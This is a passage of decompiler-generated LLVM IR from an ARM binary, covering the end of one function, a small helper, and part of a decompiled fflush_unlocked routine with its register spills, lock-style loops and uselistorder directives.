  store i1 %v3_179f8, i1* %cpsr_c.global-to-local, align 1
  %v9_179f8 = icmp eq i32 %v0_17a00, %v1_179f8
  br i1 %v9_179f8, label %dec_label_pc_17a00, label %dec_label_pc_179f8.dec_label_pc_179c8_crit_edge

dec_label_pc_179f8.dec_label_pc_179c8_crit_edge:  ; preds = %dec_label_pc_179f8
  %v0_179c8.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_179c8

dec_label_pc_17a00:                               ; preds = %dec_label_pc_179f8
  %v2_17a00 = icmp ne i32 %v1_179f8, 0
  store i1 %v2_17a00, i1* %cpsr_c.global-to-local, align 1
  %v7_17a04 = icmp slt i32 %v1_179f8, 2
  br i1 %v7_17a04, label %dec_label_pc_17a20, label %dec_label_pc_17a08

dec_label_pc_17a08:                               ; preds = %dec_label_pc_17a00
  %v0_17a08 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_17a08, i32* %r0.global-to-local, align 4
  %v0_17a0c = load i32, i32* %r1.global-to-local, align 4
  %v1_17a0c = add i32 %v0_17a0c, 129
  store i32 %v1_17a0c, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_17a20

dec_label_pc_17a20:                               ; preds = %dec_label_pc_179a4, %dec_label_pc_17a08, %dec_label_pc_17a00
  store i32 80, i32* %r3.global-to-local, align 4
  %v0_17a24 = load i32, i32* %r5.global-to-local, align 4
  %v2_17a24 = add i32 %v0_17a24, 80
  %v3_17a24 = inttoptr i32 %v2_17a24 to i32*
  %v4_17a24 = load i32, i32* %v3_17a24, align 4
  store i32 %v4_17a24, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_17a2c = inttoptr i32 %v4_17a24 to i32*
  store i32 0, i32* %v2_17a2c, align 4
  br label %dec_label_pc_17a30

dec_label_pc_17a30:                               ; preds = %dec_label_pc_178a4, %dec_label_pc_178cc, %dec_label_pc_17a20
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_17a34 = load i32, i32* %r5.global-to-local, align 4
  %v2_17a34 = add i32 %v0_17a34, 160
  %v3_17a34 = inttoptr i32 %v2_17a34 to i32*
  %v4_17a34 = load i32, i32* %v3_17a34, align 4
  store i32 %v4_17a34, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_17a3c = add i32 %v0_17a34, 12
  %v3_17a3c = inttoptr i32 %v2_17a3c to i32*
  %v4_17a3c = load i32, i32* %v3_17a3c, align 4
  store i32 %v4_17a3c, i32* %r1.global-to-local, align 4
  %v1_17a40 = add i32 %v4_17a34, 4
  %v2_17a40 = inttoptr i32 %v1_17a40 to i32*
  %v3_17a40 = load i32, i32* %v2_17a40, align 4
  store i32 %v3_17a40, i32* %r2.global-to-local, align 4
  %v1_17a44 = inttoptr i32 %v4_17a3c to i32*
  %v2_17a44 = load i32, i32* %v1_17a44, align 4
  %v1_17a48 = add i32 %v3_17a40, -1
  store i32 %v1_17a48, i32* %r2.global-to-local, align 4
  %v1_17a4c = add i32 %v2_17a44, -1
  store i32 %v1_17a4c, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17a50 = icmp eq i32 %v1_17a48, 0
  store i32 %v1_17a4c, i32* %v1_17a44, align 4
  %v0_17a58 = load i32, i32* %r2.global-to-local, align 4
  %v1_17a58 = load i32, i32* %r0.global-to-local, align 4
  %v2_17a58 = add i32 %v1_17a58, 4
  %v3_17a58 = inttoptr i32 %v2_17a58 to i32*
  store i32 %v0_17a58, i32* %v3_17a58, align 4
  br i1 %v2_17a50, label %dec_label_pc_17a60, label %dec_label_pc_17ac0

dec_label_pc_17a60:                               ; preds = %dec_label_pc_17a30
  %v0_17a60 = load i32, i32* %r2.global-to-local, align 4
  %v1_17a60 = load i32, i32* %r0.global-to-local, align 4
  %v2_17a60 = add i32 %v1_17a60, 8
  %v3_17a60 = inttoptr i32 %v2_17a60 to i32*
  store i32 %v0_17a60, i32* %v3_17a60, align 4
  %v0_17a64 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_17a64, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_17a68

dec_label_pc_17a68:                               ; preds = %dec_label_pc_17a98.dec_label_pc_17a68_crit_edge, %dec_label_pc_17a60
  %v0_17a68 = phi i32 [ %v0_17a68.pre, %dec_label_pc_17a98.dec_label_pc_17a68_crit_edge ], [ %v0_17a64, %dec_label_pc_17a60 ]
  %v1_17a68 = inttoptr i32 %v0_17a68 to i32*
  %v2_17a68 = load i32, i32* %v1_17a68, align 4
  store i32 %v2_17a68, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_17a68, i32* %r2.global-to-local, align 4
  %v2_17a7462 = load i32, i32* %v1_17a68, align 4
  store i32 %v2_17a7462, i32* %r3.global-to-local, align 4
  %v3_17a7864 = icmp uge i32 %v2_17a7462, %v2_17a68
  store i1 %v3_17a7864, i1* %cpsr_c.global-to-local, align 1
  %v9_17a7870 = icmp eq i32 %v2_17a7462, %v2_17a68
  br i1 %v9_17a7870, label %dec_label_pc_17a80, label %dec_label_pc_17a98

dec_label_pc_17a80:                               ; preds = %dec_label_pc_17a68, %dec_label_pc_17a80.dec_label_pc_17a74_crit_edge
  %v0_17a8071 = phi i32 [ %v1_17a78.pre, %dec_label_pc_17a80.dec_label_pc_17a74_crit_edge ], [ %v2_17a68, %dec_label_pc_17a68 ]
  store i32 %v0_17a8071, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_17a90 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_17a90, label %dec_label_pc_17a94, label %dec_label_pc_17a80.dec_label_pc_17a74_crit_edge

dec_label_pc_17a80.dec_label_pc_17a74_crit_edge:  ; preds = %dec_label_pc_17a80
  %v0_17a74.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_17a78.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_17a74 = inttoptr i32 %v0_17a74.pre to i32*
  %v2_17a74 = load i32, i32* %v1_17a74, align 4
  store i32 %v2_17a74, i32* %r3.global-to-local, align 4
  %v3_17a78 = icmp uge i32 %v2_17a74, %v1_17a78.pre
  store i1 %v3_17a78, i1* %cpsr_c.global-to-local, align 1
  %v9_17a78 = icmp eq i32 %v2_17a74, %v1_17a78.pre
  br i1 %v9_17a78, label %dec_label_pc_17a80, label %dec_label_pc_17a98

dec_label_pc_17a94:                               ; preds = %dec_label_pc_17a80
  %v0_17a94 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_17a94, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17a98

dec_label_pc_17a98:                               ; preds = %dec_label_pc_17a68, %dec_label_pc_17a80.dec_label_pc_17a74_crit_edge, %dec_label_pc_17a94
  %v0_17aa0 = phi i32 [ %v0_17a94, %dec_label_pc_17a94 ], [ %v2_17a7462, %dec_label_pc_17a68 ], [ %v2_17a74, %dec_label_pc_17a80.dec_label_pc_17a74_crit_edge ]
  %v1_17a98 = phi i32 [ %v0_17a94, %dec_label_pc_17a94 ], [ %v2_17a68, %dec_label_pc_17a68 ], [ %v1_17a78.pre, %dec_label_pc_17a80.dec_label_pc_17a74_crit_edge ]
  %v3_17a98 = icmp uge i32 %v0_17aa0, %v1_17a98
  store i1 %v3_17a98, i1* %cpsr_c.global-to-local, align 1
  %v9_17a98 = icmp eq i32 %v0_17aa0, %v1_17a98
  br i1 %v9_17a98, label %dec_label_pc_17aa0, label %dec_label_pc_17a98.dec_label_pc_17a68_crit_edge

dec_label_pc_17a98.dec_label_pc_17a68_crit_edge:  ; preds = %dec_label_pc_17a98
  %v0_17a68.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_17a68

dec_label_pc_17aa0:                               ; preds = %dec_label_pc_17a98
  %v2_17aa0 = icmp ne i32 %v1_17a98, 0
  store i1 %v2_17aa0, i1* %cpsr_c.global-to-local, align 1
  %v7_17aa4 = icmp slt i32 %v1_17a98, 2
  br i1 %v7_17aa4, label %dec_label_pc_17ac0, label %dec_label_pc_17aa8

dec_label_pc_17aa8:                               ; preds = %dec_label_pc_17aa0
  %v0_17aa8 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_17aa8, i32* %r0.global-to-local, align 4
  %v0_17aac = load i32, i32* %r1.global-to-local, align 4
  %v1_17aac = add i32 %v0_17aac, 129
  store i32 %v1_17aac, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_17ac0

dec_label_pc_17ac0:                               ; preds = %dec_label_pc_17a30, %dec_label_pc_17aa8, %dec_label_pc_17aa0
  %v2_17ac4 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_17ac4, i32* %r4.global-to-local, align 4
  %v1_17ac8 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_17ac8

; uselistorder directives
  uselistorder i32 %v0_17a94, { 1, 0, 2 }
  uselistorder i32 %v1_17a78.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_17a68, { 1, 0 }
  uselistorder i32 %v0_179f4, { 1, 0, 2 }
  uselistorder i32 %v1_179d8.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_179c8, { 1, 0 }
  uselistorder i32 %v0_17994, { 2, 1, 0 }
  uselistorder i32 %v0_17938, { 1, 0 }
  uselistorder i32 %v0_1791c, { 1, 0, 2 }
  uselistorder i32 %v1_17900.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_178ec, { 1, 0 }
  uselistorder i32 %v0_17890, { 1, 0, 2 }
  uselistorder i32 %v1_17874.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v4_17848, { 2, 1, 0, 3 }
  uselistorder i32* %r7.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10, 12, 14, 13, 15 }
  uselistorder i32* %r6.global-to-local, { 5, 6, 0, 1, 2, 3, 4 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 6, 4, 5, 7 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 3, 2, 41, 4, 5, 6, 7, 8, 9, 10, 12, 11, 42, 13, 14, 15, 43, 44, 16, 17, 18, 19, 20, 21, 22, 24, 23, 39, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 36, 35, 40, 37, 38 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 12, 9, 10, 11 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 2, 23, 24, 3, 4, 5, 6, 25, 26, 7, 10, 8, 9, 27, 11, 12, 19, 20, 13, 14, 15, 16, 17, 21, 22, 18 }
  uselistorder i32 8192, { 3, 0, 1, 2 }
  uselistorder i32 47, { 2, 0, 7, 3, 4, 5, 6, 1 }
  uselistorder i32 32816, { 2, 0, 1 }
  uselistorder label %dec_label_pc_17ac0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_17a98, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17a80, { 1, 0 }
  uselistorder label %dec_label_pc_17a30, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17a20, { 1, 2, 0 }
  uselistorder label %dec_label_pc_179f8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_179e0, { 1, 0 }
  uselistorder label %dec_label_pc_17994, { 1, 0 }
  uselistorder label %bb52, { 1, 0 }
  uselistorder label %bb50, { 1, 0 }
  uselistorder label %dec_label_pc_1795c, { 1, 0 }
  uselistorder label %dec_label_pc_17930, { 1, 0 }
  uselistorder label %bb48, { 1, 0 }
  uselistorder label %dec_label_pc_17920, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17908, { 1, 0 }
  uselistorder label %dec_label_pc_178a4, { 1, 0 }
  uselistorder label %bb45, { 1, 0 }
  uselistorder label %dec_label_pc_17894, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1787c, { 1, 0 }
}

define i32 @function_17ad0(i32 %arg1) local_unnamed_addr {
dec_label_pc_17ad0:
  %v0_17ad0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_17ad0, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_17ad0
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_17ad0, %bb
  %v10_17ae4 = phi i32 [ %arg1, %dec_label_pc_17ad0 ], [ 0, %bb ]
  ret i32 %v10_17ae4

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @fflush_unlocked(i16* %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v6_17ae8 = load i32, i32* @r5, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23010.366 to i32), i32* @r6, align 4
  %v4_17af8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.366 to i32), i32 76) to i32*), align 4
  store i32 %v4_17af8, i32* %r3.global-to-local, align 4
  %v4_17afc = icmp uge i32 %tmp, %v4_17af8
  store i1 %v4_17afc, i1* %cpsr_c.global-to-local, align 1
  %v10_17afc = icmp eq i32 %tmp, %v4_17af8
  br i1 %v10_17afc, label %bb, label %dec_label_pc_17b14

bb:                                               ; preds = %entry
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %tmp, i32* @r4, align 4
  br label %dec_label_pc_17b24

dec_label_pc_17b14:                               ; preds = %entry
  store i32 %tmp, i32* @r4, align 4
  store i32 256, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v3_17b18 = icmp eq i16* %arg1, null
  br i1 %v3_17b18, label %dec_label_pc_17b24, label %dec_label_pc_17e38

dec_label_pc_17b24:                               ; preds = %bb, %dec_label_pc_17b14
  %stack_var_-44.1 = phi i32 [ 0, %bb ], [ 256, %dec_label_pc_17b14 ]
  store i32 160, i32* %r3.global-to-local, align 4
  %v4_17b28 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.366 to i32), i32 160) to i32*), align 4
  store i32 %v4_17b28, i32* %r5.global-to-local, align 4
  %v0_17b2c = call i32 @__aeabi_read_tp()
  store i32 %v0_17b2c, i32* %r0.global-to-local, align 4
  %v1_17b30 = add i32 %v4_17b28, 8
  %v2_17b30 = inttoptr i32 %v1_17b30 to i32*
  %v3_17b30 = load i32, i32* %v2_17b30, align 4
  store i32 %v3_17b30, i32* %r3.global-to-local, align 4
  %v1_17b34 = add i32 %v0_17b2c, -1168
  store i32 %v1_17b34, i32* %r8.global-to-local, align 4
  %v3_17b38 = icmp uge i32 %v3_17b30, %v1_17b34
  store i1 %v3_17b38, i1* %cpsr_c.global-to-local, align 1
  %v9_17b38 = icmp eq i32 %v3_17b30, %v1_17b34
  br i1 %v9_17b38, label %dec_label_pc_17b80, label %dec_label_pc_17b40

dec_label_pc_17b40:                               ; preds = %dec_label_pc_17b24
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_17b28, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_17b4c143 = inttoptr i32 %v4_17b28 to i32*
  %v2_17b4c144 = load i32, i32* %v1_17b4c143, align 4
  store i32 %v2_17b4c144, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_17b50146 = icmp eq i32 %v2_17b4c144, 0
  br i1 %v9_17b50146, label %dec_label_pc_17b58, label %dec_label_pc_17b70

dec_label_pc_17b58:                               ; preds = %dec_label_pc_17b40, %dec_label_pc_17b58.dec_label_pc_17b4c_crit_edge
  %v0_17b58147 = phi i32 [ %v1_17b50.pre, %dec_label_pc_17b58.dec_label_pc_17b4c_crit_edge ], [ 0, %dec_label_pc_17b40 ]
  store i32 %v0_17b58147, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_17b68 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_17b68, label %dec_label_pc_17b6c, label %dec_label_pc_17b58.dec_label_pc_17b4c_crit_edge

dec_label_pc_17b58.dec_label_pc_17b4c_crit_edge:  ; preds = %dec_label_pc_17b58
  %v0_17b4c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_17b50.pre = load i32, i32* @r4, align 4
  %v1_17b4c = inttoptr i32 %v0_17b4c.pre to i32*
  %v2_17b4c = load i32, i32* %v1_17b4c, align 4
  store i32 %v2_17b4c, i32* %r3.global-to-local, align 4
  %v3_17b50 = icmp uge i32 %v2_17b4c, %v1_17b50.pre
  store i1 %v3_17b50, i1* %cpsr_c.global-to-local, align 1
  %v9_17b50 = icmp eq i32 %v2_17b4c, %v1_17b50.pre
  br i1 %v9_17b50, label %dec_label_pc_17b58, label %dec_label_pc_17b70

dec_label_pc_17b6c:                               ; preds = %dec_label_pc_17b58
  %v0_17b6c = load i32, i32* @r4, align 4
  store i32 %v0_17b6c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17b70

dec_label_pc_17b70:                               ; preds = %dec_label_pc_17b40, %dec_label_pc_17b58.dec_label_pc_17b4c_crit_edge, %dec_label_pc_17b6c
  %v0_17b70 = phi i32 [ %v0_17b6c, %dec_label_pc_17b6c ], [ %v2_17b4c144, %dec_label_pc_17b40 ], [ %v2_17b4c, %dec_label_pc_17b58.dec_label_pc_17b4c_crit_edge ]
  %v1_17b70 = phi i32 [ %v0_17b6c, %dec_label_pc_17b6c ], [ 0, %dec_label_pc_17b40 ], [ %v1_17b50.pre, %dec_label_pc_17b58.dec_label_pc_17b4c_crit_edge ]
  %v3_17b70 = icmp uge i32 %v0_17b70, %v1_17b70
  store i1 %v3_17b70, i1* %cpsr_c.global-to-local, align 1
  %v9_17b70 = icmp eq i32 %v0_17b70, %v1_17b70
  br i1 %v9_17b70, label %bb66, label %bb65

bb65:                                             ; preds = %dec_label_pc_17b70
  %v1_17b74 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_17b74, i32* %r0.global-to-local, align 4
  br label %bb66

bb66:                                             ; preds = %dec_label_pc_17b70, %bb65
  %v1_17b78 = xor i1 %v9_17b70, true
  call void @__pseudo_cond_branch(i1 %v1_17b78, i32 ptrtoint (i32* @global_var_1543c.528 to i32))
  %v0_17b7c = load i32, i32* %r8.global-to-local, align 4
  %v1_17b7c = load i32, i32* %r5.global-to-local, align 4
  %v2_17b7c = add i32 %v1_17b7c, 8
  %v3_17b7c = inttoptr i32 %v2_17b7c to i32*
  store i32 %v0_17b7c, i32* %v3_17b7c, align 4
  br label %dec_label_pc_17b80

dec_label_pc_17b80:                               ; preds = %dec_label_pc_17b24, %bb66
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_17b84 = load i32, i32* @r6, align 4
  %v2_17b84 = add i32 %v0_17b84, 160
  %v3_17b84 = inttoptr i32 %v2_17b84 to i32*
  %v4_17b84 = load i32, i32* %v3_17b84, align 4
  store i32 %v4_17b84, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_17b8c = add i32 %v0_17b84, 12
  %v3_17b8c = inttoptr i32 %v2_17b8c to i32*
  %v4_17b8c = load i32, i32* %v3_17b8c, align 4
  store i32 %v4_17b8c, i32* %r2.global-to-local, align 4
  %v1_17b90 = add i32 %v4_17b84, 4
  %v2_17b90 = inttoptr i32 %v1_17b90 to i32*
  %v3_17b90 = load i32, i32* %v2_17b90, align 4
  store i32 %v3_17b90, i32* %r1.global-to-local, align 4
  %v1_17b94 = inttoptr i32 %v4_17b8c to i32*
  %v2_17b94 = load i32, i32* %v1_17b94, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17b98 = icmp eq i32 %v3_17b90, 0
  %v1_17b9c = add i32 %v2_17b94, 1
  store i32 %v1_17b9c, i32* %r3.global-to-local, align 4
  store i32 %v1_17b9c, i32* %v1_17b94, align 4
  br i1 %v2_17b98, label %dec_label_pc_17ba8, label %dec_label_pc_17c08

dec_label_pc_17ba8:                               ; preds = %dec_label_pc_17b80
  %v0_17ba8 = load i32, i32* %r1.global-to-local, align 4
  %v1_17ba8 = load i32, i32* %r0.global-to-local, align 4
  %v2_17ba8 = add i32 %v1_17ba8, 8
  %v3_17ba8 = inttoptr i32 %v2_17ba8 to i32*
  store i32 %v0_17ba8, i32* %v3_17ba8, align 4
  %v0_17bac = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_17bac, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_17bb0

dec_label_pc_17bb0:                               ; preds = %dec_label_pc_17be0.dec_label_pc_17bb0_crit_edge, %dec_label_pc_17ba8
  %v0_17bb0 = phi i32 [ %v0_17bb0.pre, %dec_label_pc_17be0.dec_label_pc_17bb0_crit_edge ], [ %v0_17bac, %dec_label_pc_17ba8 ]
  %v1_17bb0 = inttoptr i32 %v0_17bb0 to i32*
  %v2_17bb0 = load i32, i32* %v1_17bb0, align 4
  store i32 %v2_17bb0, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_17bb0, i32* %r2.global-to-local, align 4
  %v2_17bbc131 = load i32, i32* %v1_17bb0, align 4
  store i32 %v2_17bbc131, i32* %r3.global-to-local, align 4
  %v3_17bc0133 = icmp uge i32 %v2_17bbc131, %v2_17bb0
  store i1 %v3_17bc0133, i1* %cpsr_c.global-to-local, align 1
  %v9_17bc0139 = icmp eq i32 %v2_17bbc131, %v2_17bb0
  br i1 %v9_17bc0139, label %dec_label_pc_17bc8, label %dec_label_pc_17be0

dec_label_pc_17bc8:                               ; preds = %dec_label_pc_17bb0, %dec_label_pc_17bc8.dec_label_pc_17bbc_crit_edge
  %v0_17bc8140 = phi i32 [ %v1_17bc0.pre, %dec_label_pc_17bc8.dec_label_pc_17bbc_crit_edge ], [ %v2_17bb0, %dec_label_pc_17bb0 ]
  store i32 %v0_17bc8140, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_17bd8 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_17bd8, label %dec_label_pc_17bdc, label %dec_label_pc_17bc8.dec_label_pc_17bbc_crit_edge

dec_label_pc_17bc8.dec_label_pc_17bbc_crit_edge:  ; preds = %dec_label_pc_17bc8
  %v0_17bbc.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_17bc0.pre = load i32, i32* @r4, align 4
  %v1_17bbc = inttoptr i32 %v0_17bbc.pre to i32*
  %v2_17bbc = load i32, i32* %v1_17bbc, align 4
  store i32 %v2_17bbc, i32* %r3.global-to-local, align 4
  %v3_17bc0 = icmp uge i32 %v2_17bbc, %v1_17bc0.pre
  store i1 %v3_17bc0, i1* %cpsr_c.global-to-local, align 1
  %v9_17bc0 = icmp eq i32 %v2_17bbc, %v1_17bc0.pre
  br i1 %v9_17bc0, label %dec_label_pc_17bc8, label %dec_label_pc_17be0

dec_label_pc_17bdc:                               ; preds = %dec_label_pc_17bc8
  %v0_17bdc = load i32, i32* @r4, align 4
  store i32 %v0_17bdc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17be0

dec_label_pc_17be0:                               ; preds = %dec_label_pc_17bb0, %dec_label_pc_17bc8.dec_label_pc_17bbc_crit_edge, %dec_label_pc_17bdc
  %v0_17be8 = phi i32 [ %v0_17bdc, %dec_label_pc_17bdc ], [ %v2_17bbc131, %dec_label_pc_17bb0 ], [ %v2_17bbc, %dec_label_pc_17bc8.dec_label_pc_17bbc_crit_edge ]
  %v1_17be0 = phi i32 [ %v0_17bdc, %dec_label_pc_17bdc ], [ %v2_17bb0, %dec_label_pc_17bb0 ], [ %v1_17bc0.pre, %dec_label_pc_17bc8.dec_label_pc_17bbc_crit_edge ]
  %v3_17be0 = icmp uge i32 %v0_17be8, %v1_17be0
  store i1 %v3_17be0, i1* %cpsr_c.global-to-local, align 1
  %v9_17be0 = icmp eq i32 %v0_17be8, %v1_17be0
  br i1 %v9_17be0, label %dec_label_pc_17be8, label %dec_label_pc_17be0.dec_label_pc_17bb0_crit_edge

dec_label_pc_17be0.dec_label_pc_17bb0_crit_edge:  ; preds = %dec_label_pc_17be0
  %v0_17bb0.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_17bb0

dec_label_pc_17be8:                               ; preds = %dec_label_pc_17be0
  %v2_17be8 = icmp ne i32 %v1_17be0, 0
  store i1 %v2_17be8, i1* %cpsr_c.global-to-local, align 1
  %v7_17bec = icmp slt i32 %v1_17be0, 2
  br i1 %v7_17bec, label %dec_label_pc_17c08, label %dec_label_pc_17bf0

dec_label_pc_17bf0:                               ; preds = %dec_label_pc_17be8
  %v0_17bf0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_17bf0, i32* %r0.global-to-local, align 4
  %v0_17bf4 = load i32, i32* %r1.global-to-local, align 4
  %v1_17bf4 = add i32 %v0_17bf4, 129
  store i32 %v1_17bf4, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17c08

dec_label_pc_17c08:                               ; preds = %dec_label_pc_17b80, %dec_label_pc_17bf0, %dec_label_pc_17be8
  store i32 152, i32* %r3.global-to-local, align 4
  %v0_17c0c = load i32, i32* @r6, align 4
  %v2_17c0c = add i32 %v0_17c0c, 152
  %v3_17c0c = inttoptr i32 %v2_17c0c to i32*
  %v4_17c0c = load i32, i32* %v3_17c0c, align 4
  store i32 %v4_17c0c, i32* %r5.global-to-local, align 4
  %v1_17c10 = add i32 %v4_17c0c, 8
  %v2_17c10 = inttoptr i32 %v1_17c10 to i32*
  %v3_17c10 = load i32, i32* %v2_17c10, align 4
  store i32 %v3_17c10, i32* %r3.global-to-local, align 4
  %v1_17c14 = load i32, i32* %r8.global-to-local, align 4
  %v3_17c14 = icmp uge i32 %v3_17c10, %v1_17c14
  store i1 %v3_17c14, i1* %cpsr_c.global-to-local, align 1
  %v9_17c14 = icmp eq i32 %v3_17c10, %v1_17c14
  br i1 %v9_17c14, label %dec_label_pc_17c5c, label %dec_label_pc_17c1c

dec_label_pc_17c1c:                               ; preds = %dec_label_pc_17c08
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_17c0c, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_17c28123 = inttoptr i32 %v4_17c0c to i32*
  %v2_17c28124 = load i32, i32* %v1_17c28123, align 4
  store i32 %v2_17c28124, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_17c2c126 = icmp eq i32 %v2_17c28124, 0
  br i1 %v9_17c2c126, label %dec_label_pc_17c34, label %dec_label_pc_17c4c

dec_label_pc_17c34:                               ; preds = %dec_label_pc_17c1c, %dec_label_pc_17c34.dec_label_pc_17c28_crit_edge
  %v0_17c34127 = phi i32 [ %v1_17c2c.pre, %dec_label_pc_17c34.dec_label_pc_17c28_crit_edge ], [ 0, %dec_label_pc_17c1c ]
  store i32 %v0_17c34127, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_17c44 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_17c44, label %dec_label_pc_17c48, label %dec_label_pc_17c34.dec_label_pc_17c28_crit_edge

dec_label_pc_17c34.dec_label_pc_17c28_crit_edge:  ; preds = %dec_label_pc_17c34
  %v0_17c28.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_17c2c.pre = load i32, i32* @r4, align 4
  %v1_17c28 = inttoptr i32 %v0_17c28.pre to i32*
  %v2_17c28 = load i32, i32* %v1_17c28, align 4
  store i32 %v2_17c28, i32* %r3.global-to-local, align 4
  %v3_17c2c = icmp uge i32 %v2_17c28, %v1_17c2c.pre
  store i1 %v3_17c2c, i1* %cpsr_c.global-to-local, align 1
  %v9_17c2c = icmp eq i32 %v2_17c28, %v1_17c2c.pre
  br i1 %v9_17c2c, label %dec_label_pc_17c34, label %dec_label_pc_17c4c

dec_label_pc_17c48:                               ; preds = %dec_label_pc_17c34
  %v0_17c48 = load i32, i32* @r4, align 4
  store i32 %v0_17c48, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17c4c

dec_label_pc_17c4c:                               ; preds = %dec_label_pc_17c1c, %dec_label_pc_17c34.dec_label_pc_17c28_crit_edge, %dec_label_pc_17c48
  %v0_17c4c = phi i32 [ %v0_17c48, %dec_label_pc_17c48 ], [ %v2_17c28124, %dec_label_pc_17c1c ], [ %v2_17c28, %dec_label_pc_17c34.dec_label_pc_17c28_crit_edge ]
